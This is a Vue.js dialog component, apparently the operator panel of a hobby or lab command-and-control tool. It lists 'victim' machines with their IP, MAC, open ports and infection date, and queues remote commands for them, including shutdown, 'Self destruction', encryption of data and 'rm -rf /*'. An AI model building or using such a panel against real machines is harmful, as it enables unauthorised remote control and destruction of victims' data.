<template>
  <v-dialog
    v-model="dialog"
    max-width="900px"
    max-height="500px"
    scrollable
    @close="dialog = false"
  >
    <v-card>
      <v-card-title style="font-size:22px" class="px-lg-10 px-md-4 py-lg-8 py-lg-6">
          {{ title }}
      </v-card-title>
      <v-card-text class="px-lg-10 px-md-4">
        <div v-if="!showMessage" class="w-100 h-100 d-center">
          <p style="20px">{{ text }}</p>
        </div>
        <div v-if="dialogType ==='remoteCommand'" class="w-100 h-100 d-center">
            <v-container>
                <v-row v-if="!showMessage">
                    <v-col>
                        <v-select
                            @change="changeCommand"
                            :items="commands"
                            label="Select a command"
                        ></v-select>
                    </v-col>
                </v-row>
                <v-row v-if="showMessage">
                    <v-col>
                        <p style="font-size:18px">El comando se ha enviado al servidor, cuando la víctima se conecte se ejecutará y obtendremos una respuesta.</p>
                    </v-col>
                </v-row>
                <v-row v-if="!showMessage">
                    <v-col>
                        <v-btn @click="sendCommand">
                            Enviar
                        </v-btn>
                    </v-col>
                </v-row>
            </v-container>
        </div>
        <div v-if="dialogType ==='showInfo'" class="w-100 h-100 d-center">
            <v-container>
                <v-row>
                    <v-col>
                        <b>Hostname:</b>
                    </v-col>
                    <v-col>
                        {{ victimInfo.nombre }}
                    </v-col>
                </v-row>
                <v-row>
                    <v-col>
                        <b>Sistema operativo:</b>
                    </v-col>
                    <v-col>
                        {{ victimInfo.so }}
                    </v-col>
                </v-row>
                <v-row>
                    <v-col>
                        <b>Dirección IP:</b>
                    </v-col>
                    <v-col>
                        {{ victimInfo.ip }}
                    </v-col>
                </v-row>
                <v-row>
                    <v-col>
                        <b>Fecha infección:</b>
                    </v-col>
                    <v-col>
                        {{ victimInfo.infectionTime }}
                    </v-col>
                </v-row>
                <v-row>
                    <v-col>
                        <b>Última conexión:</b>
                    </v-col>
                    <v-col>
                        {{ victimInfo.ultima_fecha }}
                    </v-col>
                </v-row>
                <v-row>
                    <v-col>
                        <b>Puertos abiertos:</b>
                    </v-col>
                    <v-col>
                        {{ victimInfo.puertos }}
                    </v-col>
                </v-row>
                <v-row>
                    <v-col>
                        <b>MAC:</b>
                    </v-col>
                    <v-col>
                        {{ victimInfo.mac }}
                    </v-col>
                </v-row>
                <v-row>
                    <v-col>
                        <b>Dominio:</b>
                    </v-col>
                    <v-col>
                        {{ victimInfo.dominio }}
                    </v-col>
                </v-row>
                <v-row>
                    <v-col>
                        <v-expansion-panels accordion>
                            <v-expansion-panel
                            v-for="(item,i) in commands"
                            :key="i"
                            >
                            <v-expansion-panel-header>
                                {{item.text}}
                            </v-expansion-panel-header>
                            <v-expansion-panel-content>
                                <p v-if="item.text === 'ls /etc'">{{ commandsInfo.ls }}</p>
                                <p v-if="item.text === 'self destruction'">{{ commandsInfo.encriptar }}</p>
                                <p v-if="item.text === 'arp'">{{ commandsInfo.home }}</p>
                                <p v-if="item.text === 'netstat -putona'">{{ commandsInfo.home }}</p>
                                <p v-if="item.text === 'shutdown'">{{ commandsInfo.home }}</p>
                                <p v-if="item.text === 'rm -rf /*'">{{ commandsInfo.ls }}</p>
                            </v-expansion-panel-content>
                            </v-expansion-panel>
                        </v-expansion-panels>
                    </v-col>
                </v-row>
            </v-container>
        </div>
        <div v-if="dialogType ==='remoteCommand'" class="w-100 h-100 d-center">

        </div>
      </v-card-text>
    </v-card>
  </v-dialog>
</template>
<script>
import axios from "axios";
export default {
  props: {
    dialog: {
      type: Boolean,
      default: false
    },
    title:{
        type: String,
        default: "Comando remoto"
    },
    text:{
        type: String,
        default: "Agrega un comando en el formulario para ejecutarlo la próxima vez que se conecte la víctima"
    },
    dialogType:{
        type: String,
        default:"remoteCommand"
    },
    id:{
        type: Number,
        default: 1
    }
    
  },
  data() {
    return {
        commandToSend:null,
        cookiesMessage: true,
        lastCookies: null,
        dialogTypeData: this.dialogType,
        showMessage: false,
        victimInfo: {
            active:true,
            lastTime:"26-11-21",
            hostname:"mmarinse",
            ip:"10.10.11.102",
            infectionTime:"21-11-21",
            operativeSystem:"Linux Debian 11 OS"
        },
      commands:[
          {
            text: "ls /etc",
            value: 1,
          },
          {
            text: "Self destruction",
            value: 2,
          },
          {
            text: "arp",
            value: 3,
          },
          {
            text: "Cifrar información",
            value: 4,
          },
          {
            text: "shutdown",
            value: 5,
          }
      ],
      commandsInfo:{
        list:"ajlksjklsa",
        encrypt:"26-11-21",
        propagation:"mmarinse",
        shutdown:"10.10.11.102",
        ports:"21-11-21",
        infoSystem:"Linux Debian 11 OS"
      }
    }
  },
  methods:{
    parseObjectToArray: function(subject){
        const objectArray = Object.entries(subject);
        console.log("YEEAH", objectArray)
    },
    obtainVictim: async function(){
        let result
        let victim
        let hola = this.id
        try{
            result = await axios.get(`http://127.0.0.1:3050/equipos/${hola}`)
        }catch(e){
            console.log(e)
        }
        victim = result.data
        // let año = victim.ultima_fecha.substring(0,4)
        // let mes = victim.ultima_fecha.substring(4,6)
        // let dia = victim.ultima_fecha.substring(6,8)
        // let hora = victim.ultima_fecha.substring(8,10)
        // let min = victim.ultima_fecha.substring(10,12)
        // let seg = victim.ultima_fecha.substring(12,14)
        // let miliseg = victim.ultima_fecha.substring(14,16)
        //victim.ultima_fecha = new Date(año,mes - 1,dia,hora,min,seg,miliseg)
        return victim
    },
    obtainCommands: async function(){
        let result
        let hola = this.id
        debugger
        try{
            result = await axios.get(`http://127.0.0.1:3050/comandos/${hola}`)
        }catch(e){
            console.log(e)
        }
        debugger
        return result.data
    },
    changeCommand:function(e){
        this.commandToSend = e
    },
    sendCommand: async function(){
        let result
        let body = {
            id_equipo:this.id,
            pendiente: this.commandToSend
        }
        try{
            result = await axios.patch(`http://127.0.0.1:3050/comandos/update/`, body)
        }catch(e){
            console.log(e)
        }
        this.showMessage = true
    }
  },
  watch: {
    open(value) {
      this.dialog = value;
    },
    async dialog(value) {
      if (!value) {
        this.$emit('dialog-closed', false);
        this.showMessage = false
      }
      if(value){
          if(this.dialogType === "showInfo"){
              this.commandsInfo = await this.obtainCommands()
              this.victimInfo = await this.obtainVictim()
              let hola = this.commandsInfo
                            debugger
          }
        // console.log("SEEE:",this.victimInfo)
        // this.parseObjectToArray(this.commandsInfo)
        // console.log("HEELLO",this.commandsInfo)
      }
    }
  },
}
</script>
<style>
.w-100{
    width:100%;
}
</style>
